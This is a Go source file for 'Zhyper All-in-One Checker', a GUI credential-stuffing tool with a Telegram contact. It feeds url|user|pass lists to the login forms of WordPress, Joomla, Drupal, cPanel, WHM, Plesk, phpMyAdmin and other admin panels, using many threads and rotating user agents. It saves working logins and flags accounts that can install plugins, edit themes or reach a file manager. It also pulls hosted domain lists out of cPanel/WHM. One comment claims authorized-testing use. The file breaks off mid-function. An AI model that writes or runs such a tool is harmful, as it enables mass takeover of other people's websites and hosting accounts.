package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"image/color"
	"io"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

// User Agents array - all 22 user agents
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
}

// CMS Configuration
type CMSConfig struct {
	Name            string
	LoginURLs       []string
	SuccessPatterns []string
	FailPatterns    []string
}

var cmsConfigs = map[string]CMSConfig{
	"wordpress": {
		Name:            "WordPress",
		LoginURLs:       []string{"/wp-login.php", "/wp-admin/", "/wp/wp-login.php"},
		SuccessPatterns: []string{"wp-admin/profile.php", "wp-admin/index.php", "dashboard"},
		FailPatterns:    []string{"login_error", "incorrect", "invalid"},
	},
	"joomla": {
		Name:            "Joomla",
		LoginURLs:       []string{"/administrator/", "/administrator/index.php"},
		SuccessPatterns: []string{"com_cpanel", "option=com_admin", "administration"},
		FailPatterns:    []string{"error", "incorrect", "invalid"},
	},
	"drupal": {
		Name:            "Drupal",
		LoginURLs:       []string{"/user/login", "/user", "/?q=user/login"},
		SuccessPatterns: []string{"/user/", "logged-in", "drupal"},
		FailPatterns:    []string{"incorrect", "invalid", "error"},
	},
	"opencart": {
		Name:            "OpenCart",
		LoginURLs:       []string{"/admin/", "/admin/index.php"},
		SuccessPatterns: []string{"dashboard", "common/dashboard", "route=common/dashboard"},
		FailPatterns:    []string{"error", "warning", "incorrect"},
	},
	"moodle": {
		Name:            "Moodle",
		LoginURLs:       []string{"/login/index.php", "/login/"},
		SuccessPatterns: []string{"my/", "dashboard", "loggedin"},
		FailPatterns:    []string{"errorcode", "invalid login", "error"},
	},
	"ojs": {
		Name:            "OJS",
		LoginURLs:       []string{"/index.php/index/login", "/login", "/index.php/login"},
		SuccessPatterns: []string{"user/profile", "submissions", "dashboard"},
		FailPatterns:    []string{"error", "invalid", "incorrect"},
	},
	"cpanel": {
		Name:            "cPanel",
		LoginURLs:       []string{":2083/login/", ":2083/", "/cpanel"},
		SuccessPatterns: []string{"cpanel", "frontend", "success"},
		FailPatterns:    []string{"error", "incorrect", "invalid"},
	},
	"whm": {
		Name:            "WHM",
		LoginURLs:       []string{":2087/", ":2087/login/"},
		SuccessPatterns: []string{"whm", "success"},
		FailPatterns:    []string{"error", "incorrect"},
	},
	"plesk": {
		Name:            "Plesk",
		LoginURLs:       []string{":8443/login_up.php", ":8443/"},
		SuccessPatterns: []string{"smb/web/view", "success"},
		FailPatterns:    []string{"error", "incorrect"},
	},
	"directadmin": {
		Name:            "DirectAdmin",
		LoginURLs:       []string{":2222/", "/CMD_LOGIN"},
		SuccessPatterns: []string{"CMD_ACCOUNT_ADMIN", "success"},
		FailPatterns:    []string{"error", "incorrect"},
	},
	"phpmyadmin": {
		Name:            "phpMyAdmin",
		LoginURLs:       []string{"/phpmyadmin/", "/pma/", "/phpMyAdmin/"},
		SuccessPatterns: []string{"server_databases.php", "main.php", "index.php?route=/"},
		FailPatterns:    []string{"error", "denied", "cannot log in"},
	},
	"adminer": {
		Name:            "Adminer",
		LoginURLs:       []string{"/adminer.php", "/adminer/"},
		SuccessPatterns: []string{"database=", "adminer.php?"},
		FailPatterns:    []string{"error", "invalid", "incorrect"},
	},
}

// CPanelDomainExtractor struct
type CPanelDomainExtractor struct {
	client  *http.Client
	baseURL string
	debug   bool
	mu      sync.Mutex
}

func NewCPanelDomainExtractor(client *http.Client, baseURL string, debug bool) *CPanelDomainExtractor {
	return &CPanelDomainExtractor{
		client:  client,
		baseURL: baseURL,
		debug:   debug,
	}
}

func (c *CPanelDomainExtractor) extractDomains() []string {
	domains := make(map[string]bool)

	// Method 1: Extract from domains page
	fromPage := c.extractFromDomainsPage()
	for _, d := range fromPage {
		domains[d] = true
	}

	// Method 2: Extract via listaccts
	fromListAccts := c.extractViaListaccts()
	for _, d := range fromListAccts {
		domains[d] = true
	}

	// Method 3: Extract via domaininfo
	fromDomainInfo := c.extractViaDomaininfo()
	for _, d := range fromDomainInfo {
		domains[d] = true
	}

	// Method 4: Extract via park API
	fromParkAPI := c.extractViaParkAPI()
	for _, d := range fromParkAPI {
		domains[d] = true
	}

	// Method 5: Extract via addon API
	fromAddonAPI := c.extractViaAddonAPI()
	for _, d := range fromAddonAPI {
		domains[d] = true
	}

	// Method 6: HTML scraping
	fromHTML := c.extractViaHTMLScraping()
	for _, d := range fromHTML {
		domains[d] = true
	}

	// Convert map to slice
	result := make([]string, 0, len(domains))
	for d := range domains {
		result = append(result, d)
	}

	return c.cleanupDomains(result)
}

func (c *CPanelDomainExtractor) extractFromDomainsPage() []string {
	domains := []string{}

	urls := []string{
		c.baseURL + "/frontend/paper_lantern/domains/index.html",
		c.baseURL + "/frontend/jupiter/domains/index.html",
		c.baseURL + "/cpanel/domains/index.html",
	}

	for _, url := range urls {
		resp, err := c.client.Get(url)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		// Extract domains from JSON data
		re := regexp.MustCompile(`"domain"\s*:\s*"([^"]+)"`)
		matches := re.FindAllStringSubmatch(bodyStr, -1)
		for _, match := range matches {
			if len(match) > 1 {
				domains = append(domains, match[1])
			}
		}
	}

	return domains
}

func (c *CPanelDomainExtractor) extractViaListaccts() []string {
	domains := []string{}

	url := c.baseURL + "/json-api/listaccts?api.version=1"
	resp, err := c.client.Get(url)
	if err != nil {
		return domains
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err == nil {
		if accts, ok := data["data"].(map[string]interface{})["acct"].([]interface{}); ok {
			for _, acct := range accts {
				if acctMap, ok := acct.(map[string]interface{}); ok {
					if domain, ok := acctMap["domain"].(string); ok {
						domains = append(domains, domain)
					}
				}
			}
		}
	}

	return domains
}

func (c *CPanelDomainExtractor) extractViaDomaininfo() []string {
	domains := []string{}

	url := c.baseURL + "/json-api/domaininfo?api.version=1"
	resp, err := c.client.Get(url)
	if err != nil {
		return domains
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	re := regexp.MustCompile(`"domain"\s*:\s*"([^"]+)"`)
	matches := re.FindAllStringSubmatch(bodyStr, -1)
	for _, match := range matches {
		if len(match) > 1 {
			domains = append(domains, match[1])
		}
	}

	return domains
}

func (c *CPanelDomainExtractor) extractViaParkAPI() []string {
	domains := []string{}

	url := c.baseURL + "/json-api/Park/list?api.version=1"
	resp, err := c.client.Get(url)
	if err != nil {
		return domains
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	re := regexp.MustCompile(`"domain"\s*:\s*"([^"]+)"`)
	matches := re.FindAllStringSubmatch(bodyStr, -1)
	for _, match := range matches {
		if len(match) > 1 {
			domains = append(domains, match[1])
		}
	}

	return domains
}

func (c *CPanelDomainExtractor) extractViaAddonAPI() []string {
	domains := []string{}

	url := c.baseURL + "/json-api/AddonDomain/list?api.version=1"
	resp, err := c.client.Get(url)
	if err != nil {
		return domains
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	re := regexp.MustCompile(`"domain"\s*:\s*"([^"]+)"`)
	matches := re.FindAllStringSubmatch(bodyStr, -1)
	for _, match := range matches {
		if len(match) > 1 {
			domains = append(domains, match[1])
		}
	}

	return domains
}

func (c *CPanelDomainExtractor) extractViaHTMLScraping() []string {
	domains := []string{}

	urls := []string{
		c.baseURL + "/cpanel",
		c.baseURL + "/frontend/paper_lantern/index.html",
	}

	for _, url := range urls {
		resp, err := c.client.Get(url)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		// Extract domains from HTML
		re := regexp.MustCompile(`([a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.)+[a-zA-Z]{2,}`)
		matches := re.FindAllString(bodyStr, -1)
		domains = append(domains, matches...)
	}

	return domains
}

func (c *CPanelDomainExtractor) cleanupDomains(domains []string) []string {
	cleaned := make(map[string]bool)

	for _, domain := range domains {
		domain = strings.TrimSpace(domain)
		domain = strings.ToLower(domain)

		// Skip invalid domains
		if len(domain) < 4 || !strings.Contains(domain, ".") {
			continue
		}

		// Skip common non-domain strings
		skip := false
		for _, exclude := range []string{"cpanel", "webmail", "localhost", "example.com"} {
			if strings.Contains(domain, exclude) {
				skip = true
				break
			}
		}

		if !skip {
			cleaned[domain] = true
		}
	}

	result := make([]string, 0, len(cleaned))
	for d := range cleaned {
		result = append(result, d)
	}

	return result
}

// ZhyperChecker struct
type ZhyperChecker struct {
	app          fyne.App
	window       fyne.Window
	terminal     *widget.RichText
	statLabels   map[string]*widget.Label
	fileEntry    *widget.Entry
	threadsEntry *widget.Entry
	debugCheck   *widget.Check
	deepCheck    *widget.Check
	startBtn     *widget.Button
	stopBtn      *widget.Button

	stats      map[string]int
	statsMu    sync.Mutex
	lines      []string
	running    bool
	runningMu  sync.Mutex
	cms        string
	ojsCache   map[string]bool
	ojsCacheMu sync.Mutex
	logMu      sync.Mutex
}

func NewZhyperChecker() *ZhyperChecker {
	zc := &ZhyperChecker{
		app:        app.NewWithID("com.zhyper.checker"),
		stats:      make(map[string]int),
		statLabels: make(map[string]*widget.Label),
		ojsCache:   make(map[string]bool),
	}

	zc.window = zc.app.NewWindow("Zhyper All-in-One Checker V4.8.7")
	zc.createWidgets()

	return zc
}

func (z *ZhyperChecker) createWidgets() {
	// Set window size
	z.window.Resize(fyne.NewSize(950, 750))

	// Create header
	header := canvas.NewText("ZHYPER ALL-IN-ONE V4.8.7", color.RGBA{0, 255, 0, 255})
	header.TextSize = 24
	header.TextStyle = fyne.TextStyle{Bold: true}
	header.Alignment = fyne.TextAlignCenter

	// Create statistics panel
	z.statLabels["total"] = widget.NewLabel("Total: 0")
	z.statLabels["done"] = widget.NewLabel("Done: 0")
	z.statLabels["valid"] = widget.NewLabel("Valid: 0")
	z.statLabels["fail"] = widget.NewLabel("Fail: 0")
	z.statLabels["err"] = widget.NewLabel("Err: 0")

	statsContainer := container.NewHBox(
		z.statLabels["total"],
		widget.NewSeparator(),
		z.statLabels["done"],
		widget.NewSeparator(),
		z.statLabels["valid"],
		widget.NewSeparator(),
		z.statLabels["fail"],
		widget.NewSeparator(),
		z.statLabels["err"],
	)

	// Create terminal output
	z.terminal = widget.NewRichText()
	z.terminal.Wrapping = fyne.TextWrapWord
	terminalScroll := container.NewVScroll(z.terminal)
	terminalScroll.SetMinSize(fyne.NewSize(900, 400))

	// Create control panel
	z.fileEntry = widget.NewEntry()
	z.fileEntry.SetPlaceHolder("Select file...")

	browseBtn := widget.NewButton("Browse", z.browse)

	fileContainer := container.NewBorder(nil, nil, nil, browseBtn, z.fileEntry)

	z.threadsEntry = widget.NewEntry()
	z.threadsEntry.SetText("10")
	z.threadsEntry.SetPlaceHolder("Threads (1-500)")

	z.debugCheck = widget.NewCheck("Debug", nil)
	z.deepCheck = widget.NewCheck("DEEP", nil)

	optionsContainer := container.NewHBox(
		widget.NewLabel("Threads:"),
		z.threadsEntry,
		z.debugCheck,
		z.deepCheck,
	)

	z.startBtn = widget.NewButton("START", z.start)
	z.startBtn.Importance = widget.HighImportance

	z.stopBtn = widget.NewButton("STOP", z.stop)
	z.stopBtn.Disable()

	buttonsContainer := container.NewHBox(
		z.startBtn,
		z.stopBtn,
	)

	controlPanel := container.NewVBox(
		widget.NewLabel("File:"),
		fileContainer,
		widget.NewSeparator(),
		optionsContainer,
		widget.NewSeparator(),
		buttonsContainer,
	)

	// Main container with dark background
	mainContainer := container.NewBorder(
		container.NewVBox(
			header,
			widget.NewSeparator(),
			statsContainer,
			widget.NewSeparator(),
		),
		container.NewVBox(
			widget.NewSeparator(),
			controlPanel,
		),
		nil,
		nil,
		terminalScroll,
	)

	z.window.SetContent(mainContainer)

	// Show banner on startup
	z.showBanner()
}

func (z *ZhyperChecker) log(message string, color string) {
	z.logMu.Lock()
	defer z.logMu.Unlock()

	// Color mapping
	colors := map[string]color.RGBA{
		"green":   {0, 255, 0, 255},
		"red":     {255, 68, 68, 255},
		"yellow":  {255, 170, 0, 255},
		"cyan":    {0, 170, 255, 255},
		"gray":    {102, 102, 102, 255},
		"white":   {255, 255, 255, 255},
		"magenta": {255, 0, 255, 255},
	}

	c, ok := colors[color]
	if !ok {
		c = colors["white"]
	}

	// Add timestamp
	timestamp := time.Now().Format("15:04:05")
	fullMessage := fmt.Sprintf("[%s] %s", timestamp, message)

	// Append to terminal
	z.terminal.Segments = append(z.terminal.Segments, &widget.TextSegment{
		Text: fullMessage + "\n",
		Style: widget.RichTextStyle{
			ColorName: "",
			Inline:    true,
			TextStyle: fyne.TextStyle{},
		},
	})
	z.terminal.Refresh()
}

func (z *ZhyperChecker) updateStat(key string, value int) {
	z.statsMu.Lock()
	z.stats[key] = value
	z.statsMu.Unlock()

	if label, ok := z.statLabels[key]; ok {
		label.SetText(fmt.Sprintf("%s: %d", strings.Title(key), value))
	}
}

func (z *ZhyperChecker) incrStat(key string) {
	z.statsMu.Lock()
	z.stats[key]++
	val := z.stats[key]
	z.statsMu.Unlock()

	if label, ok := z.statLabels[key]; ok {
		label.SetText(fmt.Sprintf("%s: %d", strings.Title(key), val))
	}
}

func (z *ZhyperChecker) browse() {
	dialog.ShowFileOpen(func(reader fyne.URIReadCloser, err error) {
		if err != nil || reader == nil {
			return
		}
		defer reader.Close()

		z.fileEntry.SetText(reader.URI().Path())
	}, z.window)
}

func (z *ZhyperChecker) showBanner() {
	banner := `
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║      ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗     ║
║      ╚══███╔╝██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ║
║        ███╔╝ ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ║
║       ███╔╝  ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗    ║
║      ███████╗██║  ██║   ██║   ██║     ███████╗██║  ██║    ║
║      ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝    ║
║                                                            ║
║              ALL-IN-ONE CHECKER V4.8.7                     ║
║        Multi-CMS Credential Checker with GUI               ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
`
	z.log(banner, "green")
	z.log("Supported CMS: WordPress, Joomla, Drupal, OpenCart, Moodle, OJS, cPanel, WHM, Plesk, DirectAdmin, phpMyAdmin, Adminer", "cyan")
	z.log("Contact: https://t.me/zhyperflow", "magenta")
	z.log("Ready to start...", "white")
}

func (z *ZhyperChecker) detectCMS(filename string) string {
	filename = strings.ToLower(filename)

	cmsKeywords := map[string]string{
		"wordpress":   "wordpress",
		"wp":          "wordpress",
		"joomla":      "joomla",
		"drupal":      "drupal",
		"opencart":    "opencart",
		"moodle":      "moodle",
		"ojs":         "ojs",
		"cpanel":      "cpanel",
		"whm":         "whm",
		"plesk":       "plesk",
		"directadmin": "directadmin",
		"phpmyadmin":  "phpmyadmin",
		"adminer":     "adminer",
	}

	for keyword, cms := range cmsKeywords {
		if strings.Contains(filename, keyword) {
			return cms
		}
	}

	return "wordpress" // Default
}

func (z *ZhyperChecker) start() {
	filePath := z.fileEntry.Text
	if filePath == "" {
		z.log("Please select a file first!", "red")
		return
	}

	// Read file
	file, err := os.Open(filePath)
	if err != nil {
		z.log(fmt.Sprintf("Error opening file: %s", err), "red")
		return
	}
	defer file.Close()

	z.lines = []string{}
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			z.lines = append(z.lines, line)
		}
	}

	if len(z.lines) == 0 {
		z.log("File is empty!", "red")
		return
	}

	// Detect CMS from filename
	z.cms = z.detectCMS(filepath.Base(filePath))
	z.log(fmt.Sprintf("Detected CMS: %s", strings.ToUpper(z.cms)), "cyan")

	// Create result directory
	os.MkdirAll("result", 0755)

	// Update UI
	z.startBtn.Disable()
	z.stopBtn.Enable()
	z.updateStat("total", len(z.lines))
	z.updateStat("done", 0)
	z.updateStat("valid", 0)
	z.updateStat("fail", 0)
	z.updateStat("err", 0)

	z.runningMu.Lock()
	z.running = true
	z.runningMu.Unlock()

	z.log(fmt.Sprintf("Starting check with %s lines...", strconv.Itoa(len(z.lines))), "cyan")

	// Start checking in goroutine
	go z.run()
}

func (z *ZhyperChecker) stop() {
	z.runningMu.Lock()
	z.running = false
	z.runningMu.Unlock()

	z.log("Stopping...", "yellow")
	z.startBtn.Enable()
	z.stopBtn.Disable()
}

func (z *ZhyperChecker) run() {
	threads := 10
	if t, err := strconv.Atoi(z.threadsEntry.Text); err == nil && t > 0 && t <= 500 {
		threads = t
	}

	// Create worker pool
	workChan := make(chan string, len(z.lines))
	var wg sync.WaitGroup

	// Start workers
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for line := range workChan {
				z.runningMu.Lock()
				running := z.running
				z.runningMu.Unlock()

				if !running {
					break
				}

				z.check(line)
			}
		}()
	}

	// Feed work
	for _, line := range z.lines {
		z.runningMu.Lock()
		running := z.running
		z.runningMu.Unlock()

		if !running {
			break
		}

		workChan <- line
	}

	close(workChan)
	wg.Wait()

	z.log("Checking completed!", "green")
	z.startBtn.Enable()
	z.stopBtn.Disable()
}

func (z *ZhyperChecker) check(line string) {
	parts := strings.Split(line, "|")
	if len(parts) != 3 {
		z.incrStat("err")
		z.incrStat("done")
		z.log(fmt.Sprintf("Invalid format: %s", line), "yellow")
		return
	}

	urlStr := strings.TrimSpace(parts[0])
	username := strings.TrimSpace(parts[1])
	password := strings.TrimSpace(parts[2])

	// Create HTTP client with SSL verification disabled for testing
	// NOTE: InsecureSkipVerify is intentionally enabled to allow testing
	// against sites with self-signed certificates. This tool is for
	// authorized security testing only on systems you own or have permission to test.
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     jar,
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // #nosec G402
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil // Follow redirects
		},
	}

	debug := z.debugCheck.Checked

	// Route to appropriate checker
	switch z.cms {
	case "wordpress":
		z.checkWordPress(client, urlStr, username, password, debug)
	case "joomla":
		z.checkJoomla(client, urlStr, username, password, debug)
	case "drupal":
		z.checkDrupal(client, urlStr, username, password, debug)
	case "opencart":
		z.checkOpenCart(client, urlStr, username, password, debug)
	case "moodle":
		z.checkMoodle(client, urlStr, username, password, debug)
	case "ojs":
		z.checkOJS(client, urlStr, username, password, debug)
	case "cpanel":
		z.checkCPanel(client, urlStr, username, password, debug)
	case "whm":
		z.checkWHM(client, urlStr, username, password, debug)
	case "plesk":
		z.checkPlesk(client, urlStr, username, password, debug)
	case "directadmin":
		z.checkDirectAdmin(client, urlStr, username, password, debug)
	case "phpmyadmin":
		z.checkPhpMyAdmin(client, urlStr, username, password, debug)
	case "adminer":
		z.checkAdminer(client, urlStr, username, password, debug)
	default:
		z.checkWordPress(client, urlStr, username, password, debug)
	}

	z.incrStat("done")
}

// WordPress Checker
func (z *ZhyperChecker) checkWordPress(client *http.Client, urlStr, username, password string, debug bool) {
	// Parse base URL
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.log(fmt.Sprintf("Invalid URL: %s", urlStr), "yellow")
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	// Detect WordPress login form
	if !z.detectWordpressLoginForm(client, baseURL, debug) {
		if debug {
			z.log(fmt.Sprintf("Not a WordPress site: %s", baseURL), "gray")
		}
		z.incrStat("fail")
		return
	}

	// Try login
	loginURL := baseURL + "/wp-login.php"

	data := url.Values{}
	data.Set("log", username)
	data.Set("pwd", password)
	data.Set("wp-submit", "Log In")
	data.Set("redirect_to", baseURL+"/wp-admin/")
	data.Set("testcookie", "1")

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		z.incrStat("err")
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		if debug {
			z.log(fmt.Sprintf("Connection error: %s", err), "yellow")
		}
		z.incrStat("err")
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	// Validate login
	if z.validateWordpressEnhanced(bodyStr, resp, debug) {
		z.incrStat("valid")
		z.log(fmt.Sprintf("[✓] WordPress Valid: %s|%s|%s", urlStr, username, password), "green")
		z.saveResult("wordpress", fmt.Sprintf("%s|%s|%s", urlStr, username, password))

		// Check for admin capabilities
		z.checkWordPressAdmin(client, baseURL, urlStr, username, password, debug)
	} else {
		z.incrStat("fail")
		if debug {
			z.log(fmt.Sprintf("[✗] WordPress Failed: %s|%s", urlStr, username), "red")
		}
	}
}

func (z *ZhyperChecker) detectWordpressLoginForm(client *http.Client, baseURL string, debug bool) bool {
	loginURLs := []string{
		baseURL + "/wp-login.php",
		baseURL + "/wp-admin/",
		baseURL + "/wp/wp-login.php",
	}

	for _, loginURL := range loginURLs {
		req, err := http.NewRequest("GET", loginURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", getRandomUserAgent())

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		if strings.Contains(bodyStr, "wp-submit") ||
			strings.Contains(bodyStr, "wordpress") ||
			strings.Contains(bodyStr, "wp-login") {
			return true
		}
	}

	return false
}

func (z *ZhyperChecker) validateWordpressEnhanced(body string, resp *http.Response, debug bool) bool {
	score := 0

	// Success patterns
	successPatterns := []string{
		"wp-admin/profile.php",
		"wp-admin/index.php",
		"dashboard",
		"howdy",
		"wp-admin/admin.php",
	}

	for _, pattern := range successPatterns {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
			score += 2
		}
	}

	// Check cookies
	for _, cookie := range resp.Cookies() {
		if strings.HasPrefix(cookie.Name, "wordpress_logged_in") {
			score += 3
		}
	}

	// Fail patterns
	failPatterns := []string{
		"login_error",
		"incorrect",
		"invalid",
		"error",
		"wp-login.php?action=lostpassword",
	}

	for _, pattern := range failPatterns {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
			score -= 2
		}
	}

	if debug {
		z.log(fmt.Sprintf("WordPress validation score: %d", score), "gray")
	}

	return score >= 2
}

func (z *ZhyperChecker) checkWordPressAdmin(client *http.Client, baseURL, urlStr, username, password string, debug bool) {
	// Check admin dashboard
	dashboardURL := baseURL + "/wp-admin/"
	req, err := http.NewRequest("GET", dashboardURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	isAdmin := false
	hasFileManager := false
	hasAppearance := false
	hasPluginInstall := false

	// Check for admin indicators
	adminPatterns := []string{
		"administrator",
		"role=\"administrator\"",
		"wp-admin-bar-my-account",
	}

	for _, pattern := range adminPatterns {
		if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(pattern)) {
			isAdmin = true
			break
		}
	}

	// Check for filemanager
	if strings.Contains(bodyStr, "filemanager") || strings.Contains(bodyStr, "file-manager") {
		hasFileManager = true
	}

	// Check for appearance editor
	if strings.Contains(bodyStr, "theme-editor") || strings.Contains(bodyStr, "appearance") {
		hasAppearance = true
	}

	// Check for plugin install capability
	if strings.Contains(bodyStr, "plugin-install") || strings.Contains(bodyStr, "install_plugins") {
		hasPluginInstall = true
	}

	// Save results
	credential := fmt.Sprintf("%s|%s|%s", urlStr, username, password)

	if isAdmin {
		z.saveResult("wordpress_admin", credential)
		z.log(fmt.Sprintf("[+] WordPress Admin: %s", credential), "green")
	}

	if hasFileManager {
		z.saveResult("wordpress_filemanager", credential)
		z.log(fmt.Sprintf("[+] WordPress Filemanager: %s", credential), "green")
	}

	if hasAppearance {
		z.saveResult("wordpress_appearance", credential)
		z.log(fmt.Sprintf("[+] WordPress Appearance: %s", credential), "green")
	}

	if hasPluginInstall {
		z.saveResult("wordpress_install_plugin", credential)
		z.log(fmt.Sprintf("[+] WordPress Install Plugin: %s", credential), "green")
	}
}

// Joomla Checker
func (z *ZhyperChecker) checkJoomla(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	loginURL := baseURL + "/administrator/index.php"

	// Get CSRF token
	token := z.extractJoomlaCSRFToken(client, loginURL, debug)

	// Try login
	data := url.Values{}
	data.Set("username", username)
	data.Set("passwd", password)
	data.Set("option", "com_login")
	data.Set("task", "login")
	data.Set("return", "aW5kZXgucGhw")
	if token != "" {
		data.Set(token, "1")
	}

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		z.incrStat("err")
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		z.incrStat("err")
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if z.validateJoomlaFinal(bodyStr, resp, debug) {
		z.incrStat("valid")
		z.log(fmt.Sprintf("[✓] Joomla Valid: %s|%s|%s", urlStr, username, password), "green")
		z.saveResult("joomla", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
	} else {
		z.incrStat("fail")
		if debug {
			z.log(fmt.Sprintf("[✗] Joomla Failed: %s|%s", urlStr, username), "red")
		}
	}
}

func (z *ZhyperChecker) extractJoomlaCSRFToken(client *http.Client, loginURL string, debug bool) string {
	req, err := http.NewRequest("GET", loginURL, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

